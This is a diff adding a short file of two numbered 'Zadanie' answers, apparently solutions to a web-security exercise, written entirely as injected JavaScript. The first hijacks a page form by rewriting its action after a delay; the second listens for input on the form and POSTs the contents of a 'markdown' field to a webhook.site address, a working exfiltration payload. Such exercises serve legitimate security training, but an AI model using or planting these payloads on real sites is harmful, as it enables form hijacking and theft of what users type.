@@ -1,0 +1,22 @@
+Zadanie 1:
+
+<script>
+   setTimeout(() => {
+      document.getElementsByTagName('form')[0].action = 'https://www.youtube.com/';
+   }, "1000");
+</script>
+
+Zadanie 2:
+<script>
+    window.onload = () => {
+        var form = document.getElementsByTagName("form")[0];
+
+        form.addEventListener("input", (e) => {
+            fetch("https://webhook.site/c0845ab9-92f6-4f2c-be36-8d19319ef553", {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(document.getElementById('markdown').value)
+            })
+        }, false);
+    }
+</script>
